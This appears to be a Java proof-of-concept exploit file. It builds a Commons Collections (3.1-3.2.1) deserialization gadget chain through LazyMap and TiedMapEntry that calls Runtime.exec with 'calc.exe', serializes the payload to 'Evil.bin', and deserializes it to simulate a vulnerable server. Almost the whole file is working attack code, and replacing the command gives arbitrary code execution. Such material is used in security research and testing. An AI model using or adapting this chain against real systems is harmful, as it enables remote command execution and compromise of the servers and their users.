package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


/**
 * 	Gadget chain:
 *     java.util.HashMap.readObject()
 *         java.util.HashMap.hash()
 *             TiedMapEntry.hashCode()
 *                 TiedMapEntry.getValue()
 *                 LazyMap.get()
 *                     ChainedTransformer.transform()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer:
 * 	https://github.com/zema1/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollectionsK3.java
 */


public class CCK3 {
    public static void main(String[] args) throws Exception {
        String[] execArgs = new String[]{"calc.exe"};
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)});

        HashMap<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "m");
        Map map = new HashMap();
        map.put(tiedMapEntry, "123");
        innerMap.clear();

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(map);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();

    }
}
